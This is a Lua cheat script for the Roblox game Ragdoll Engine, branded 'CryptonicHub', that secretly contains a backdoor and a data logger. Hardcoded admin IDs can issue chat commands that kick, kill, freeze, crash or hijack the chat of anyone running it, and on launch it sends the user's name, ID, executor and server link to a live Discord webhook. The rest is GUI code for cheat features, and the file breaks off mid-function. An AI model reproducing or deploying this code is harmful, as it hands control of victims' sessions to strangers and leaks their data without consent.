-- Backdoor:

local admins = {160135858,1570173214,2312,263961430,2635403611,1891561339,2026054222}
local prefix = "c!"

-- Webhook:

local notifyOnExecution = true
local usingAvatarHeadshotAsPFP = true -- true: grabs user avatar headshot, customPFP not needed. false: set customPFP with a img url
local scriptName = "CryptonicHub"
local webhookUsername = game:GetService("Players").LocalPlayer.Name .. " - (#" .. game:GetService("Players").LocalPlayer.userId .. ")"
local customPFP = "" -- Change this if usingAvatarHeadshotAsPFP is false.
local color = 0x6AA84F -- Color in HEX

-- >> Aquí empieza todo :)

if usingAvatarHeadshotAsPFP then
    customPFP = "https://www.roblox.com/Thumbs/Avatar.ashx?x=500&y=500&Format=Png&userId=" .. game:GetService("Players").LocalPlayer.UserId
end

local function getexploit()
   local exploit =
       (istempleclosure and "Temple") or
       (syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
       (secure_load and "Sentinel") or
       (is_sirhurt_closure and "Sirhurt") or
       (pebc_execute and "ProtoSmasher") or
       (KRNL_LOADED and "Krnl") or
       (WrapGlobal and "WeAreDevs") or
       (isvm and "Proxo") or
       (shadow_env and "Shadow") or
       (jit and "EasyExploits") or
       (getreg()['CalamariLuaEnv'] and "Calamari") or
       (unit and "") or
       (IS_VIVA_LOADED and "VIVA") or
       (IS_COCO_LOADED and "Coco") or
       ("Undetectable")

   return exploit
end

local globalMethods = {
    checkCaller = checkcaller,
    newCClosure = newcclosure,
    hookFunction = hookfunction,
    getGc = getgc,
    getInfo = debug.getinfo or getinfo,
    getSenv = getsenv,
    getMenv = getmenv or getsenv,
    getScriptClosure = get_script_function or getscriptclosure,
    getNamecallMethod = getnamecallmethod,
    getCallingScript = getcallingscript,
    getLoadedModules = getloadedmodules or get_loaded_modules,
    getConstants = debug.getconstants or getconstants or getconsts,
    getUpvalues = debug.getupvalues or getupvalues or getupvals,
    getProtos = debug.getprotos or getprotos,
    getStack = debug.getstack or getstack,
    getConstant = debug.getconstant or getconstant or getconst,
    getUpvalue = debug.getupvalue or getupvalue or getupval,
    getProto = debug.getproto or getproto,
    getMetatable = getrawmetatable or debug.getmetatable,
    setClipboard = setclipboard or writeclipboard,
    setConstant = debug.setconstant or setconstant or setconst,
    setUpvalue = debug.setupvalue or setupvalue or setupval,
    setStack = debug.setstack or setstack,
    setReadOnly = setreadonly,
    isLClosure = islclosure or (iscclosure and function(closure) return not iscclosure(closure) end),
    isReadOnly = isreadonly,
    isXClosure = is_synapse_function or issentinelclosure or is_protosmasher_closure or is_sirhurt_closure or checkclosure
}


local data = {
    ["username"] = webhookUsername,
    ["avatar_url"] = customPFP,
    ["embeds"] = {
        {
            ["type"] = "rich",
            ["color"] = tonumber(color),
            ["fields"] = {
                {
                    ["name"] = "Script: " .. scriptName,
                    ["value"] = "User: **" ..game:GetService("Players").LocalPlayer.Name .."**\nID: **" ..game:GetService("Players").LocalPlayer.UserId .."**\nExploit: **" ..getexploit() .."**\n[Join Server](https://www.roblox.com/games/" ..game.PlaceId .."/GAME?serverJobId=" ..game.JobId ..")/[Profile](https://www.roblox.com/users/" ..game:GetService("Players").LocalPlayer.UserId .."/profile)",
                    ["inline"] = true
                }
            }
        }
    }
}

-- >> Backdoor.							<< --

local funciones = {}

function funciones.bring(plr, args)
	game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = plr.Character:FindFirstChild("HumanoidRootPart").CFrame
end

function funciones.loopbring(plr, args)
	loopBringSwitch = true
	while loopBringSwitch do
		game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = plr.Character:FindFirstChild("HumanoidRootPart").CFrame
	end
end

function funciones.unloopbring(plr, args)
	loopBringSwitch = false
end

function funciones.kick(plr, args)
	if args then
		reason = tostring(args)
	else
		reason = "Oops, seems like someone kicked you..."
	end
	
	game:GetService("Players").LocalPlayer:Kick(reason)
	game:GetService("Players").LocalPlayer:Destroy()
end

function funciones.kill(plr, args)
	game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
	game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid"):Destroy()
end

function funciones.loopkill(plr, args)
	loopKillSwitch = true
	while loopKillSwitch do
		wait(.1)
		game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").Health = 0
		game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid"):Destroy()
	end
end

function funciones.unloopkill(plr, args)
	loopKillSwitch = false
end

function funciones.chat(plr, args)
	-- MOLDY AWEONAO NO PONGAS TAL CUAL TE SALE EN EL REMOTE SPY XDDDDD
	if string.match(string.lower(args), "gay") then
		string.gsub(args, "gay", "###")	
	end
	
	local msg = tostring(args)
	local destinatario = "All"
	local Evento = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
	Evento:FireServer(msg, destinatario)
end

function funciones.crash(plr, args)
	-- Por que hiciste un crash con print?
	while true do end -- Con que hagas eso ya sirve lol
	game:GetService("Players").LocalPlayer:Kick()
end

function funciones.freeze(plr)
	frozen = true
	pcall(function()
		while frozen do
			wait()
			game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Anchored = true
		end
	end)
end

function funciones.unfreeze(plr)
	frozen = false
	wait()
	game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Anchored = false
end


local function getPlayerByShortName(name)
	local shortName = string.lower(name)
	for _,plr in pairs(game.Players:GetChildren()) do
		local fullName = string.lower(plr.Name) -- lowercase here too
		if shortName == string.sub(fullName,1,string.len(shortName)) then
			return fullName
		end
	end
end

local function commands(msg, plr)
	if string.match(msg, "/e ") then
		msg = string.gsub(msg, "/e ", "")	
	end
	local Split = string.split(msg, " ")
	local Command = Split[1]
	local Target = Split[2]
	local Args = string.gsub(msg, Command, "")
	local Args = string.gsub(Args, Target, "")
	-- Cambios al sistema, para poder pasar más argumentos.
	if getPlayerByShortName(tostring(Target)) == string.lower(game:GetService("Players").LocalPlayer.Name) or Target == "all" and string.match(Command, prefix) then
		Command = string.gsub(Command, prefix, "")
		funciones[Command](plr, Args)
	end
end

-- Jugador q esta dentro.

for _,v in ipairs(game:GetService("Players"):GetPlayers()) do
	if table.find(admins, v.UserId) then
		v.Chatted:Connect(function(msg)
			commands(msg, v)
		end)
	end
end

-- Jugador q entra.

game:GetService("Players").PlayerAdded:Connect(function(plr)
	if table.find(admins, plr.UserId) then
		plr.Chatted:Connect(function(msg)
			commands(msg, plr)
		end)
	end
end)

-- >> Discord logs. 						<< --

local webhook = "https://discord.com/api/webhooks/898290492821884950/bq2ZTC8zvUJk_7xOvvyxvw0INcu4ijxHYFVtbTUtC1hwpsJqZFtfmuCjNdnLEu_KZ2mv"

--https://v3rmillion.net/showthread.php?tid=1027440
local currentExploit = getexploit()
if currentExploit == "Synapse" then
    local request = syn.request(
        {
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode(data)
        }
    )
elseif currentExploit == "Krnl" then
    request(
        {
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode(data)
        })

elseif currentExploit == "Temple" then
    request(
        {
            Url = webhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
end

-- Gui to Lua
-- Version: 3.2

-- Instances:

local CryptonicHubOntop = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local X = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local linea = Instance.new("Frame")
local Framewelcome = Instance.new("Frame")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local player = Instance.new("TextLabel")
local fps = Instance.new("TextLabel")
local fps_2 = Instance.new("TextLabel")
local fps_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local linea2 = Instance.new("Frame")
local home = Instance.new("TextButton")
local scripts = Instance.new("TextButton")
local Target = Instance.new("TextButton")
local Localplayer = Instance.new("TextButton")
local franescripts = Instance.new("Frame")
local TextLabel_5 = Instance.new("TextLabel")
local TextLabel_6 = Instance.new("TextLabel")
local uno = Instance.new("TextButton")
local dos = Instance.new("TextButton")
local tres = Instance.new("TextButton")
local cuatro = Instance.new("TextButton")
local xd = Instance.new("TextButton")
local lol = Instance.new("TextButton")
local target = Instance.new("Frame")
local TextLabel_7 = Instance.new("TextLabel")
local TextLabel_8 = Instance.new("TextLabel")
local ungoto = Instance.new("TextButton")
local push = Instance.new("TextButton")
local id = Instance.new("TextBox")
local goto = Instance.new("TextButton")
local Roundify = Instance.new("ImageLabel")
local localply = Instance.new("Frame")
local TextLabel_9 = Instance.new("TextLabel")
local TextLabel_10 = Instance.new("TextLabel")
local TextLabel_11 = Instance.new("TextLabel")

--Properties:

CryptonicHubOntop.Name = "CryptonicHubOntop"
CryptonicHubOntop.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
CryptonicHubOntop.ResetOnSpawn = false

MainFrame.Name = "MainFrame"
MainFrame.Parent = CryptonicHubOntop
MainFrame.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.219299316, 0, 0.425713658, 0)
MainFrame.Size = UDim2.new(0, 344, 0, 216)

X.Name = "X"
X.Parent = MainFrame
X.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
X.BackgroundTransparency = 1.000
X.BorderSizePixel = 0
X.Position = UDim2.new(0.940250576, 0, -0.00303473324, 0)
X.Size = UDim2.new(0, 20, 0, 20)
X.Font = Enum.Font.SourceSansBold
X.Text = "X"
X.TextColor3 = Color3.fromRGB(255, 255, 255)
X.TextScaled = true
X.TextSize = 14.000
X.TextWrapped = true

TextLabel.Parent = MainFrame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(-0.0554185919, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 187, 0, 24)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "CRYPTONIC <font color=\"#FFA500\">Hub</font>"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

linea.Name = "linea"
linea.Parent = MainFrame
linea.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
linea.BorderSizePixel = 0
linea.Position = UDim2.new(0.20585078, 0, 0.161812395, 0)
linea.Size = UDim2.new(0, 7, 0, 169)
linea.ZIndex = 2

Framewelcome.Name = "Framewelcome"
Framewelcome.Parent = MainFrame
Framewelcome.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
Framewelcome.BorderSizePixel = 0
Framewelcome.Position = UDim2.new(0.0184696876, 0, 0.166666716, 0)
Framewelcome.Size = UDim2.new(0, 330, 0, 151)
Framewelcome.Visible = false

TextLabel_2.Parent = Framewelcome
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.300000012, 0, -0.0397351012, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 33)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Welcome To Cryptonic Hub"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

TextLabel_3.Parent = Framewelcome
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.Position = UDim2.new(0.240785167, 0, 0.178807944, 0)
TextLabel_3.Size = UDim2.new(0, 250, 0, 116)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "Game: Ragdoll Engine                                                                       "
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 14.000
TextLabel_3.TextWrapped = true
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_3.TextYAlignment = Enum.TextYAlignment.Top

player.Name = "player"
player.Parent = Framewelcome
player.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
player.BackgroundTransparency = 1.000
player.Position = UDim2.new(0.240785167, 0, 0.258278131, 0)
player.Size = UDim2.new(0, 250, 0, 104)
player.Font = Enum.Font.SourceSans
player.Text = "Player: "
player.TextColor3 = Color3.fromRGB(255, 255, 255)
player.TextSize = 14.000
player.TextWrapped = true
player.TextXAlignment = Enum.TextXAlignment.Left
player.TextYAlignment = Enum.TextYAlignment.Top

fps.Name = "fps"
fps.Parent = Framewelcome
fps.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
fps.BackgroundTransparency = 1.000
fps.Position = UDim2.new(0.240785167, 0, 0.258278131, 0)
fps.Size = UDim2.new(0, 250, 0, 104)
fps.Font = Enum.Font.SourceSans
fps.Text = "Player: "
fps.TextColor3 = Color3.fromRGB(255, 255, 255)
fps.TextSize = 14.000
fps.TextWrapped = true
fps.TextXAlignment = Enum.TextXAlignment.Left
fps.TextYAlignment = Enum.TextYAlignment.Top

fps_2.Name = "fps"
fps_2.Parent = Framewelcome
fps_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
fps_2.BackgroundTransparency = 1.000
fps_2.Position = UDim2.new(0.240999997, 0, 0.340000004, 0)
fps_2.Size = UDim2.new(0, 250, 0, 105)
fps_2.Font = Enum.Font.SourceSans
fps_2.Text = "Fps: "
fps_2.TextColor3 = Color3.fromRGB(255, 255, 255)
fps_2.TextSize = 14.000
fps_2.TextWrapped = true
fps_2.TextXAlignment = Enum.TextXAlignment.Left
fps_2.TextYAlignment = Enum.TextYAlignment.Top

fps_3.Name = "fps"
fps_3.Parent = Framewelcome
fps_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
fps_3.BackgroundTransparency = 1.000
fps_3.Position = UDim2.new(0.240999997, 0, 0.414999992, 0)
fps_3.Size = UDim2.new(0, 250, 0, 95)
fps_3.Font = Enum.Font.SourceSans
fps_3.Text = "Ping: "
fps_3.TextColor3 = Color3.fromRGB(255, 255, 255)
fps_3.TextSize = 14.000
fps_3.TextWrapped = true
fps_3.TextXAlignment = Enum.TextXAlignment.Left
fps_3.TextYAlignment = Enum.TextYAlignment.Top

TextLabel_4.Parent = Framewelcome
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.Position = UDim2.new(0.390909106, 0, 0.91390729, 0)
TextLabel_4.Size = UDim2.new(0, 200, 0, 13)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.Text = "Made by Martiin#4420 and wmw#7622"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextScaled = true
TextLabel_4.TextSize = 14.000
TextLabel_4.TextTransparency = 0.680
TextLabel_4.TextWrapped = true
TextLabel_4.TextXAlignment = Enum.TextXAlignment.Right

linea2.Name = "linea2"
linea2.Parent = MainFrame
linea2.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
linea2.BorderSizePixel = 0
linea2.Position = UDim2.new(-0.0116279069, 0, 0.117405571, 0)
linea2.Size = UDim2.new(0, 352, 0, 3)
linea2.ZIndex = 2

home.Name = "home"
home.Parent = MainFrame
home.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
home.BackgroundTransparency = 1.000
home.Position = UDim2.new(0.0174418613, 0, 0.16504854, 0)
home.Size = UDim2.new(0, 65, 0, 23)
home.ZIndex = 10
home.Font = Enum.Font.SourceSansSemibold
home.Text = "Home"
home.TextColor3 = Color3.fromRGB(255, 255, 255)
home.TextSize = 19.000
home.TextWrapped = true

scripts.Name = "scripts"
scripts.Parent = MainFrame
scripts.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scripts.BackgroundTransparency = 1.000
scripts.Position = UDim2.new(0.0174418613, 0, 0.276699007, 0)
scripts.Size = UDim2.new(0, 65, 0, 23)
scripts.ZIndex = 10
scripts.Font = Enum.Font.SourceSansSemibold
scripts.Text = "Scripts"
scripts.TextColor3 = Color3.fromRGB(255, 255, 255)
scripts.TextSize = 19.000
scripts.TextWrapped = true

Target.Name = "Target"
Target.Parent = MainFrame
Target.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Target.BackgroundTransparency = 1.000
Target.Position = UDim2.new(0.0174418613, 0, 0.388349473, 0)
Target.Size = UDim2.new(0, 65, 0, 23)
Target.ZIndex = 10
Target.Font = Enum.Font.SourceSansSemibold
Target.Text = "Target"
Target.TextColor3 = Color3.fromRGB(255, 255, 255)
Target.TextSize = 19.000
Target.TextWrapped = true

Localplayer.Name = "Localplayer"
Localplayer.Parent = MainFrame
Localplayer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Localplayer.BackgroundTransparency = 1.000
Localplayer.Position = UDim2.new(0.0174418613, 0, 0.49999994, 0)
Localplayer.Size = UDim2.new(0, 65, 0, 23)
Localplayer.ZIndex = 10
Localplayer.Font = Enum.Font.SourceSansSemibold
Localplayer.Text = "Discord"
Localplayer.TextColor3 = Color3.fromRGB(255, 255, 255)
Localplayer.TextSize = 19.000
Localplayer.TextWrapped = true

franescripts.Name = "franescripts"
franescripts.Parent = MainFrame
franescripts.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
franescripts.BorderSizePixel = 0
franescripts.Position = UDim2.new(0.0184696987, 0, 0.166666672, 0)
franescripts.Size = UDim2.new(0, 330, 0, 168)
franescripts.Visible = false

TextLabel_5.Parent = franescripts
TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0.393939406, 0, 0.991288245, 0)
TextLabel_5.Size = UDim2.new(0, 200, 0, 13)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "Made by Martiin#4420 and wmw#7622"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 14.000
TextLabel_5.TextTransparency = 0.680
TextLabel_5.TextWrapped = true
TextLabel_5.TextXAlignment = Enum.TextXAlignment.Right

TextLabel_6.Parent = franescripts
TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.BackgroundTransparency = 1.000
TextLabel_6.Position = UDim2.new(0.300000012, 0, -0.0397351012, 0)
TextLabel_6.Size = UDim2.new(0, 200, 0, 33)
TextLabel_6.Font = Enum.Font.SourceSans
TextLabel_6.Text = "Scripts Ragdoll Engine"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.TextScaled = true
TextLabel_6.TextSize = 14.000
TextLabel_6.TextWrapped = true

uno.Name = "uno"
uno.Parent = franescripts
uno.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
uno.BorderSizePixel = 0
uno.Position = UDim2.new(0.23939395, 0, 0.21192053, 0)
uno.Size = UDim2.new(0, 115, 0, 36)
uno.Font = Enum.Font.SourceSansSemibold
uno.Text = "Push aura"
uno.TextColor3 = Color3.fromRGB(255, 255, 255)
uno.TextSize = 14.000

dos.Name = "dos"
dos.Parent = franescripts
dos.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
dos.BorderSizePixel = 0
dos.Position = UDim2.new(0.612121224, 0, 0.21192053, 0)
dos.Size = UDim2.new(0, 115, 0, 36)
dos.Font = Enum.Font.SourceSansSemibold
dos.Text = "AntiRagdoll"
dos.TextColor3 = Color3.fromRGB(255, 255, 255)
dos.TextSize = 14.000

tres.Name = "tres"
tres.Parent = franescripts
tres.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
tres.BorderSizePixel = 0
tres.Position = UDim2.new(0.23939395, 0, 0.468267113, 0)
tres.Size = UDim2.new(0, 115, 0, 36)
tres.Font = Enum.Font.SourceSansSemibold
tres.Text = "antipush"
tres.TextColor3 = Color3.fromRGB(255, 255, 255)
tres.TextSize = 14.000

cuatro.Name = "cuatro"
cuatro.Parent = franescripts
cuatro.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
cuatro.BorderSizePixel = 0
cuatro.Position = UDim2.new(0.612121224, 0, 0.468267113, 0)
cuatro.Size = UDim2.new(0, 115, 0, 36)
cuatro.Font = Enum.Font.SourceSansSemibold
cuatro.Text = "AntiRagdoll v2"
cuatro.TextColor3 = Color3.fromRGB(255, 255, 255)
cuatro.TextSize = 14.000

xd.Name = "xd"
xd.Parent = franescripts
xd.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
xd.BorderSizePixel = 0
xd.Position = UDim2.new(0.23939395, 0, 0.724219501, 0)
xd.Size = UDim2.new(0, 115, 0, 36)
xd.Font = Enum.Font.SourceSansSemibold
xd.Text = "soon"
xd.TextColor3 = Color3.fromRGB(255, 255, 255)
xd.TextSize = 14.000

lol.Name = "lol"
lol.Parent = franescripts
lol.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
lol.BorderSizePixel = 0
lol.Position = UDim2.new(0.612121224, 0, 0.724219501, 0)
lol.Size = UDim2.new(0, 115, 0, 36)
lol.Font = Enum.Font.SourceSansSemibold
lol.Text = "soon"
lol.TextColor3 = Color3.fromRGB(255, 255, 255)
lol.TextSize = 14.000

target.Name = "target"
target.Parent = MainFrame
target.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
target.BorderSizePixel = 0
target.Position = UDim2.new(0.0184696987, 0, 0.166666672, 0)
target.Size = UDim2.new(0, 330, 0, 168)
target.Visible = false

TextLabel_7.Parent = target
TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.BackgroundTransparency = 1.000
TextLabel_7.Position = UDim2.new(0.300000012, 0, -0.0397351012, 0)
TextLabel_7.Size = UDim2.new(0, 200, 0, 33)
TextLabel_7.Font = Enum.Font.SourceSans
TextLabel_7.Text = "Target Player"
TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_7.TextScaled = true
TextLabel_7.TextSize = 14.000
TextLabel_7.TextWrapped = true

TextLabel_8.Parent = target
TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.BackgroundTransparency = 1.000
TextLabel_8.Position = UDim2.new(0.393939406, 0, 0.991288245, 0)
TextLabel_8.Size = UDim2.new(0, 200, 0, 13)
TextLabel_8.Font = Enum.Font.SourceSans
TextLabel_8.Text = "Made by Martiin#4420 and wmw#7622"
TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_8.TextScaled = true
TextLabel_8.TextSize = 14.000
TextLabel_8.TextTransparency = 0.680
TextLabel_8.TextWrapped = true
TextLabel_8.TextXAlignment = Enum.TextXAlignment.Right

ungoto.Name = "ungoto"
ungoto.Parent = target
ungoto.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
ungoto.BorderSizePixel = 0
ungoto.Position = UDim2.new(0.615151525, 0, 0.729777694, 0)
ungoto.Size = UDim2.new(0, 115, 0, 36)
ungoto.Font = Enum.Font.SourceSansSemibold
ungoto.Text = "UnLoopGoto"
ungoto.TextColor3 = Color3.fromRGB(255, 255, 255)
ungoto.TextSize = 14.000

push.Name = "push"
push.Parent = target
push.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
push.BorderSizePixel = 0
push.Position = UDim2.new(0.24242425, 0, 0.473825276, 0)
push.Size = UDim2.new(0, 115, 0, 36)
push.Font = Enum.Font.SourceSansSemibold
push.Text = "PushAura + antiragdoll "
push.TextColor3 = Color3.fromRGB(255, 255, 255)
push.TextSize = 14.000

id.Name = "id"
id.Parent = target
id.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
id.BorderSizePixel = 0
id.Position = UDim2.new(0.363636374, 0, 0.202380955, 0)
id.Size = UDim2.new(0, 158, 0, 36)
id.Font = Enum.Font.RobotoCondensed
id.PlaceholderText = "Player"
id.Text = ""
id.TextColor3 = Color3.fromRGB(0, 0, 0)
id.TextSize = 14.000

goto.Name = "goto"
goto.Parent = target
goto.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
goto.BorderSizePixel = 0
goto.Position = UDim2.new(0.615151525, 0, 0.473825276, 0)
goto.Size = UDim2.new(0, 115, 0, 36)
goto.Font = Enum.Font.SourceSansSemibold
goto.Text = "LoopGoto"
goto.TextColor3 = Color3.fromRGB(255, 255, 255)
goto.TextSize = 14.000

Roundify.Name = "Roundify"
Roundify.Parent = MainFrame
Roundify.AnchorPoint = Vector2.new(0.5, 0.5)
Roundify.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Roundify.BackgroundTransparency = 1.000
Roundify.Position = UDim2.new(0.5, 0, 0.5, 0)
Roundify.Size = UDim2.new(1, 8, 1, 8)
Roundify.ZIndex = 0
Roundify.Image = "rbxassetid://3570695787"
Roundify.ImageColor3 = Color3.fromRGB(62, 62, 62)
Roundify.ScaleType = Enum.ScaleType.Slice
Roundify.SliceCenter = Rect.new(100, 100, 100, 100)
Roundify.SliceScale = 0.040

localply.Name = "localply"
localply.Parent = MainFrame
localply.Active = true
localply.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
localply.BorderSizePixel = 0
localply.Position = UDim2.new(0.0184696987, 0, 0.166666672, 0)
localply.Size = UDim2.new(0, 330, 0, 168)

TextLabel_9.Parent = localply
TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.BackgroundTransparency = 1.000
TextLabel_9.Position = UDim2.new(0.393939406, 0, 0.991288245, 0)
TextLabel_9.Size = UDim2.new(0, 200, 0, 13)
TextLabel_9.Font = Enum.Font.SourceSans
TextLabel_9.Text = "Made by Martiin#4420 and wmw#7622"
TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_9.TextScaled = true
TextLabel_9.TextSize = 14.000
TextLabel_9.TextTransparency = 0.680
TextLabel_9.TextWrapped = true
TextLabel_9.TextXAlignment = Enum.TextXAlignment.Right

TextLabel_10.Parent = localply
TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.BackgroundTransparency = 1.000
TextLabel_10.Position = UDim2.new(0.300000012, 0, -0.0397351012, 0)
TextLabel_10.Size = UDim2.new(0, 200, 0, 33)
TextLabel_10.Font = Enum.Font.SourceSans
TextLabel_10.Text = "Discord Link"
TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_10.TextScaled = true
TextLabel_10.TextSize = 14.000
TextLabel_10.TextWrapped = true

TextLabel_11.Parent = localply
TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.BackgroundTransparency = 1.000
TextLabel_11.Position = UDim2.new(0.25151515, 0, 0.329312474, 0)
TextLabel_11.Size = UDim2.new(0, 234, 0, 33)
TextLabel_11.Font = Enum.Font.SourceSans
TextLabel_11.Text = "https://discord.gg/JgFWGpeSk4"
TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_11.TextScaled = true
TextLabel_11.TextSize = 14.000
TextLabel_11.TextWrapped = true

-- Scripts:

local function RSBHBEA_fake_script() -- X.LocalScript 
	local script = Instance.new('LocalScript', X)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.MainFrame.Visible = false
	
	end)
end
coroutine.wrap(RSBHBEA_fake_script)()
local function AYVG_fake_script() -- MainFrame.drag 
	local script = Instance.new('LocalScript', MainFrame)

	local dragger = {}; 
	local resizer = {};
	local L_1_=script.Parent
	local mouse = game:GetService("Players").LocalPlayer:GetMouse();
	    local inputService = game:GetService('UserInputService');
	    local heartbeat = game:GetService("RunService").Heartbeat;
	function dragger.new(frame)
	    local SPEED = 0.1
	        local s, event = pcall(function()
	            return frame.MouseEnter
	        end)
	
	        if s then
	            frame.Active = true;
	
	            event:connect(function()
	                local input = frame.InputBegan:connect(function(key)
	                    if key.UserInputType == Enum.UserInputType.MouseButton1 then
	                        local objectPosition = Vector2.new(mouse.X - frame.AbsolutePosition.X, mouse.Y - frame.AbsolutePosition.Y);
	                        while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
	                            frame:TweenPosition(UDim2.new(0, mouse.X - objectPosition.X + (frame.Size.X.Offset * frame.AnchorPoint.X), 0, mouse.Y - objectPosition.Y + (frame.Size.Y.Offset * frame.AnchorPoint.Y)), 'Out', 'Quad', SPEED, true);
	                        end
	                    end
	                end)
	
	                local leave;
	                leave = frame.MouseLeave:connect(function()
	                    input:disconnect();
	                    leave:disconnect();
	                end)
	            end)
	        end
	    end
	    
	    function resizer.new(p, s)
	        p:GetPropertyChangedSignal('AbsoluteSize'):connect(function()
	            s.Size = UDim2.new(s.Size.X.Scale, s.Size.X.Offset, s.Size.Y.Scale, p.AbsoluteSize.Y);
	        end)
	    end
	dragger.new(L_1_)
end
coroutine.wrap(AYVG_fake_script)()
local function OKFP_fake_script() -- player.usermanage 
	local script = Instance.new('LocalScript', player)

	script.Parent.Text = "Error"
	script.Parent.Text = "Player: ".. game.Players.LocalPlayer.Name
end
coroutine.wrap(OKFP_fake_script)()
local function EJQEDD_fake_script() -- fps.usermanage 
	local script = Instance.new('LocalScript', fps)

	script.Parent.Text = "Error"
	script.Parent.Text = "Player: ".. game.Players.LocalPlayer.Name
end
coroutine.wrap(EJQEDD_fake_script)()
local function OGCSVX_fake_script() -- fps_2.usermanage 
	local script = Instance.new('LocalScript', fps_2)

	local RunService = game:GetService("RunService")
	local FpsLabel = script.Parent
	
	local TimeFunction = RunService:IsRunning() and time or os.clock
	
	local LastIteration, Start
	local FrameUpdateTable = {}
	
	local function HeartbeatUpdate()
